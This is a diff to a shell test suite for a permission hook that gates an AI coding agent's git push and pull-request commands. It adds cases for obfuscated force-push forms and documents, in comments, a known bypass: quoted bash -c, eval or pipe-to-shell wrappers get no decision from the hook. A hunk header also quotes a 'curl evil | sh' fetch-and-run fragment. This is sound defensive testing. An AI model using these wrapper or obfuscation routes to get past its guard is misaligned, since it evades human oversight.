@@ -669,9 +669,16 @@ rm -rf "$TMP"
 TMP=$(make_tmp)
 assert_ask "git push origin feat/x:main (dst=main via colon)" "$TMP" "$(make_payload 'git push origin feat/x:main')"
 rm -rf "$TMP"
+# Task-9 (AC-5, G-4): the shared isLiteralSafeCommand char-gate excludes
+# `:` from the safe set, so this colon-refspec form now hard-rejects at
+# Step 0 before Step 5's destination extraction ever runs. This is the
+# expected fail-safe transition allow -> ask, not a regression — a colon
+# refspec is outside this pipeline's push vocabulary (kebab branches +
+# semver tags, CLAUDE.md §6.2), and the old `allow` here was a narrower
+# recognizer permitting a shape the new shared char-gate now excludes.
 TMP=$(make_tmp)
-assert_allow_in_dir "git push origin feat/x:feat/y (dst=feat/y, non-default via colon)" "$DG_NORMAL_REPO" "$TMP" \
-    "$(make_payload 'git push origin feat/x:feat/y')"
+assert_ask "git push origin feat/x:feat/y (dst=feat/y, non-default via colon; Task-9: allow -> ask, colon outside the shared safe set)" \
+    "$TMP" "$(make_payload 'git push origin feat/x:feat/y')"
 rm -rf "$TMP"
 
 # multiple refspecs are NEVER the recognized closed form -> ASK,
@@ -1440,6 +1447,340 @@ assert_ask "gh --repo owner/repo pr create && curl evil | sh, autogate enabled -
 rm -rf "$TMP"
 
 rm -rf "$_dg_normal_bare" "$DG_NORMAL_REPO"
+
+# ---------------------------------------------------------------------------
+# Suite 83f (Task-8, pre-fix regression, deterministic-gate-release-enforcement
+# AC-9) — router boundary-class false positive on a quoted-literal
+# covered-action search, plus a wrapper-fallback probe. Authored BEFORE
+# hooks/ts/bodies/command-lexer.ts (Task-8's shared prepareRoutableCommand
+# pre-pass) exists — see 01-plan.md § Task-8, AC-1/AC-2/AC-3.
+#
+# Fixture-by-concatenation discipline (mirrors Suite 152 in
+# tests/test_agent_structure.py): every covered-action literal used below is
+# assembled from separate word tokens at runtime so this file's own source
+# never carries a contiguous "git push" / "gh pr merge" / "gh pr create"
+# substring inside a search-pattern payload — the same gate this suite
+# exercises must not itself misfire while a future scan reads this file.
+# ---------------------------------------------------------------------------
+
+echo
+echo "=== Suite 83f: quoted-literal router false-positive (Task-8, pre-fix) ==="
+
+_t8_git="git"; _t8_push="push"; _t8_gh="gh"; _t8_pr="pr"
+_t8_merge="merge"; _t8_create="create"
+_t8_lit_git_push="${_t8_git} ${_t8_push}"
+_t8_lit_gh_pr_merge="${_t8_gh} ${_t8_pr} ${_t8_merge}"
+_t8_lit_gh_pr_create="${_t8_gh} ${_t8_pr} ${_t8_create}"
+_t8_dq='"'
+
+# --- (a) FAILS TODAY (expected) — quoted-literal search, no wrapper, balanced
+# quotes. Live repro (01-plan.md Task-8 Notes): a read-only grep searching for
+# two covered-action literals separated by "|" inside a double-quoted pattern
+# satisfies the router's leading boundary class ([\s|;&<>()`] admits "|"), so
+# the SECOND literal is treated as though it opened a real invocation.
+# Asserting `none` (the REQUIRED/intended behavior) — this currently FAILS
+# because the actual decision today is `ask`. Task-8's pre-pass must flip
+# this to PASS by blanking the quoted span before the routers run.
+_t8_case_a1="grep -rnE ${_t8_dq}${_t8_lit_git_push}|${_t8_lit_gh_pr_merge}${_t8_dq} tests/test_dev_guard.sh"
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-1 (PRE-FIX, expected FAIL): quoted grep search, two covered-action literals separated by | -> must be none, currently ask" \
+    "$TMP" "$(make_payload "$_t8_case_a1")"
+rm -rf "$TMP"
+
+_t8_case_a2="grep -rnE ${_t8_dq}${_t8_lit_gh_pr_create}|${_t8_lit_git_push}${_t8_dq} tests/test_gate_guard.sh"
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-1 (PRE-FIX, expected FAIL): quoted grep search, reversed literal order -> must be none, currently ask" \
+    "$TMP" "$(make_payload "$_t8_case_a2")"
+rm -rf "$TMP"
+
+# --- (b) PASSES TODAY (baseline) — real invocation, bare and downstream of a
+# real pipe/chain operator, literal fully OUTSIDE quotes. Asserting `ask`
+# (today's and the required post-fix behavior) — must remain PASS after
+# Task-8 lands (AC-2: the pre-pass does not blank an unquoted command-position
+# literal; a real "|"/"&&"/"||"/";" immediately before the verb still
+# satisfies the router boundary).
+_t8_case_b_bare="${_t8_git} ${_t8_push} origin main"
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-2 (baseline, must stay PASS): bare git push, unquoted -> ask" \
+    "$TMP" "$(make_payload "$_t8_case_b_bare")"
+rm -rf "$TMP"
+
+_t8_case_b_pipe="echo hi | ${_t8_git} ${_t8_push} origin main"
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-2 (baseline, must stay PASS): git push downstream of a real pipe, unquoted -> ask" \
+    "$TMP" "$(make_payload "$_t8_case_b_pipe")"
+rm -rf "$TMP"
+
+_t8_case_b_and="echo hi && ${_t8_git} ${_t8_push} origin main"
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-2 (baseline, must stay PASS): git push after && chain, unquoted -> ask" \
+    "$TMP" "$(make_payload "$_t8_case_b_and")"
+rm -rf "$TMP"
+
+_t8_case_b_or="false || ${_t8_git} ${_t8_push} origin main"
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-2 (baseline, must stay PASS): git push after || chain, unquoted -> ask" \
+    "$TMP" "$(make_payload "$_t8_case_b_or")"
+rm -rf "$TMP"
+
+_t8_case_b_semi="echo hi; ${_t8_git} ${_t8_push} origin main"
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-2 (baseline, must stay PASS): git push after ; chain, unquoted -> ask" \
+    "$TMP" "$(make_payload "$_t8_case_b_semi")"
+rm -rf "$TMP"
+
+# --- (c1) PASSES TODAY (baseline) — wrapper/substitution exception classes,
+# UNQUOTED inner command. The router's leading-boundary class matches ("git"
+# preceded by a space/pipe/backtick/paren, never a quote character), and the
+# recognizer's own quoting/composition reject or its "must start with git
+# push" exact-form check (dev-guard.ts) already fails closed to ask. AC-3's
+# non-negotiable minimum:
+# shell -c, eval, xargs, command substitution — plus the architect's
+# additions: pipe-to-shell, process substitution.
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): bash -c UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "bash -c ${_t8_lit_git_push} origin main")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): sh -lc (combined flags) UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "sh -lc ${_t8_lit_git_push} origin main")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): zsh -c UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "zsh -c ${_t8_lit_git_push} origin main")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): eval UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "eval ${_t8_lit_git_push} origin main")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): xargs UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "echo 1 | xargs -I{} ${_t8_lit_git_push} origin main")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): \$(...) command substitution, UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "\$(echo ${_t8_lit_git_push} origin main)")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): backtick command substitution, UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "\`echo ${_t8_lit_git_push} origin main\`")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): <(...) process substitution, UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "diff <(${_t8_lit_git_push} origin main) /dev/null")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): >(...) process substitution, UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "echo ${_t8_lit_git_push} origin main >(cat)")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-8 AC-3 (baseline, must stay PASS): pipe-to-shell, UNQUOTED git push -> ask" \
+    "$TMP" "$(make_payload "echo ${_t8_lit_git_push} origin main | bash")"
+rm -rf "$TMP"
+
+# --- (c2) PRE-EXISTING, SEPARATE BYPASS — bound-scope correction. The
+# realistic form of every one of AC-3's own named wrapper examples — the
+# inner command double-quoted, exactly how bash -c/sh -c/eval actually take
+# a multi-word argument in practice — does NOT ask/deny TODAY, with or
+# without this fix. The router's leading-boundary class never admits a quote
+# character, so a verb whose FIRST character sits immediately after the
+# wrapper's opening quote never matches ANY router at all; evaluate() falls
+# through every branch to none(). This was flagged during test authoring as
+# a CRITICAL FINDING and resolved by the operator ("bound + follow-up",
+# 01-plan.md § Task-8 AC-3/AC-5 corrected wording): closing this bypass
+# requires real shell-evaluation-context parsing (resolving what a wrapper
+# actually hands to a shell), which is materially harder than quote-blanking
+# and is explicitly OUT OF SCOPE for this fix — filed as a tracked follow-up
+# (see the implementation record for the full characterization). These
+# cases assert the REQUIRED post-fix behavior: unchanged from today (`none`)
+# — the pre-pass must not worsen this pre-existing gap, and must not mask it
+# behind a false sense of coverage either.
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): bash -c QUOTED git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "bash -c ${_t8_dq}${_t8_lit_git_push} origin main${_t8_dq}")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): sh -lc QUOTED git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "sh -lc ${_t8_dq}${_t8_lit_git_push} origin main${_t8_dq}")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): zsh -c QUOTED git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "zsh -c ${_t8_dq}${_t8_lit_git_push} origin main${_t8_dq}")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): eval QUOTED git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "eval ${_t8_dq}${_t8_lit_git_push} origin main${_t8_dq}")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): xargs + sh -c QUOTED git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "echo 1 | xargs -I{} sh -c ${_t8_dq}${_t8_lit_git_push} origin {}${_t8_dq}")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): pipe-to-shell, QUOTED git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "echo ${_t8_dq}${_t8_lit_git_push} origin main${_t8_dq} | bash")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_nodecision "Task-8 AC-3 (pre-existing bypass, preserved not closed): unbalanced/unparseable quote, git push -> none, unchanged from today" \
+    "$TMP" "$(make_payload "grep -rn ${_t8_dq}${_t8_lit_git_push} origin main tests/test_dev_guard.sh")"
+rm -rf "$TMP"
+
+# ---------------------------------------------------------------------------
+# Task-9 (pre-fix regression, positive-grammar replacement) —
+# deterministic-gate-release-enforcement, AC-6/AC-10 (01-plan.md § Task-9).
+# Task-9 replaces dev-guard.ts's Step 0 char-denylist
+# (SHELL_QUOTING_OR_EXPANSION_RE = /["'\\$]/) with the SAME shared positive
+# char-gate (isLiteralSafeCommand) that gate-guard.ts adopts. Authored
+# BEFORE isLiteralSafeCommand exists in hooks/ts/bodies/command-lexer.ts.
+#
+# Ground truth verified empirically against today's compiled dev-guard.cjs
+# before authoring (pre-fix-regression Step 4):
+#   FAIL-FIRST      — AC-6's brace-refspec double-force construction: today
+#     ALLOW (unsafe); must become ask post-Task-9.
+#   REGRESSION-LOCK — the operator's full obfuscation family already asks
+#     today via dev-guard's OWN pre-existing safeguards (SHELL_COMPOSITION_RE
+#     matching the backtick/$( characters directly, or the disqualifying-flag
+#     ask fallback catching any token — brace/glob-mangled or not — that is
+#     not on the benign flag allowlist); must STAY ask post-Task-9.
+#
+# Fixture-by-concatenation discipline (mirrors the Suite 83f block above):
+# every covered-action/force literal below is assembled from separate word
+# tokens at runtime.
+# ---------------------------------------------------------------------------
+
+echo
+echo "=== Task-9: positive-grammar replacement for force-push detection (pre-fix, fail-first) ==="
+
+_t9_git="git"; _t9_push="push"
+_t9_force="--force"; _t9_dq='"'; _t9_bt='`'
+
+# ---------------------------------------------------------------------------
+# AC-6 FAIL-FIRST — brace-expansion double-force refspec. `evaluateSingleRefspec`
+# only checks whether the refspec STRING starts with "+" — a refspec that
+# starts with "{" (and brace-expands, at real shell execution time, into TWO
+# "+"-prefixed refspecs) never trips that check, and the resolved destination
+# ("otherbranch", extracted after the last colon) evaluates as an ordinary
+# non-default branch. Verified today: this ALLOWS the same double force-push
+# gate-guard.ts's Suite 160 already denies unconditionally in-lane.
+# ---------------------------------------------------------------------------
+echo
+echo "--- AC-6 fail-first: brace-expansion double-force refspec (dev-guard latent bug) ---"
+TMP=$(make_tmp)
+assert_ask "Task-9 AC-6 (PRE-FIX, expected FAIL): brace-expansion double-force refspec origin {+,+}feature:otherbranch -> ask, currently allow" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} origin {+,+}feature:otherbranch")"
+rm -rf "$TMP"
+
+# ---------------------------------------------------------------------------
+# REGRESSION-LOCK — the operator's obfuscation family, confirmed already ask
+# today via dev-guard's OWN pre-existing safeguards (not the AC-6 gap this
+# batch targets). Must STAY ask once Step 0 adopts the shared
+# isLiteralSafeCommand char-gate (a strict superset of today's denylist).
+# ---------------------------------------------------------------------------
+echo
+echo "--- regression-lock: obfuscation family already ask today (dev-guard's own safeguards) ---"
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): brace-expansion flag --for{c,c}e -> ask (already ask today — disqualifying-flag fallback)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} --for{c,c}e origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): backtick command substitution supplying the force flag -> ask (already ask today — SHELL_COMPOSITION_RE matches the backtick)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} ${_t9_bt}echo ${_t9_force}${_t9_bt} origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): \$() command substitution supplying the force flag -> ask (already ask today — SHELL_COMPOSITION_RE matches \$()" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} \$(echo ${_t9_force}) origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): variable expansion \$BRANCH as the destination -> ask (already ask today — SHELL_QUOTING_OR_EXPANSION_RE matches \$)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} origin \$BRANCH")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): parameter expansion \${F} as the destination -> ask (already ask today — same \$ match)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} origin \${F}")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): backslash-escape reconstruction --fo\\rce -> ask (already ask today — SHELL_QUOTING_OR_EXPANSION_RE matches backslash)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} --fo\\rce origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): ANSI-C-quoted \$'--force' -> ask (already ask today — \$ and quote both match)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} \$'${_t9_force}' origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): glob star --for*e -> ask (already ask today — disqualifying-flag fallback)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} --for*e origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): glob bracket-class --f[o]rce -> ask (already ask today — disqualifying-flag fallback)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} --f[o]rce origin feat/x")"
+rm -rf "$TMP"
+
+TMP=$(make_tmp)
+assert_ask "Task-9 (regression-lock): process substitution <(echo x) as an argument -> ask (already ask today — SHELL_COMPOSITION_RE matches <)" \
+    "$TMP" "$(make_payload "${_t9_git} ${_t9_push} <(echo x) origin feat/x")"
+rm -rf "$TMP"
+
+# ---------------------------------------------------------------------------
+# Baseline control — a genuinely safe, unobfuscated push to a non-default
+# branch stays ALLOW, unaffected by any of the above. DG_NORMAL_REPO (the
+# module-level hermetic fixture) is already torn down by this point in the
+# file (Suite 83f's own cleanup) — a fresh, locally-scoped hermetic repo is
+# built here via the same double-clone pattern (a throwaway first clone
+# establishes `main` on the bare remote before the real fixture clones it,
+# so `origin/HEAD` positively resolves).
+# ---------------------------------------------------------------------------
+echo
+echo "--- baseline control: unobfuscated safe push stays allow ---"
+_t9_bare=$(mktemp -d)
+_t9_throwaway=$(mktemp -d)
+_t9_repo=$(mktemp -d)
+git init --bare -q -b main "$_t9_bare" 2>/dev/null
+git clone -q "$_t9_bare" "$_t9_throwaway" 2>/dev/null
+(
+    cd "$_t9_throwaway" || exit 1
+    git config user.email "test@test.com"
+    git config user.name "Test"
+    git checkout -q -B main 2>/dev/null
+    echo init > README.md
+    git add README.md
+    git commit -q -m initial 2>/dev/null
+    git push -q origin HEAD:main 2>/dev/null
+)
+git clone -q "$_t9_bare" "$_t9_repo" 2>/dev/null
+rm -rf "$_t9_throwaway"
+(
+    cd "$_t9_repo" || exit 1
+    git config user.email "test@test.com"
+    git config user.name "Test"
+)
+TMP=$(make_tmp)
+assert_allow_in_dir "Task-9 (baseline, must stay PASS): plain 'git push origin feat/x', no obfuscation -> allow" \
+    "$_t9_repo" "$TMP" "$(make_payload "${_t9_git} ${_t9_push} origin feat/x")"
+rm -rf "$TMP" "$_t9_bare" "$_t9_repo"
+
+# Marker: deterministic-gate-release-enforcement
 
 # ---------------------------------------------------------------------------
 # Summary
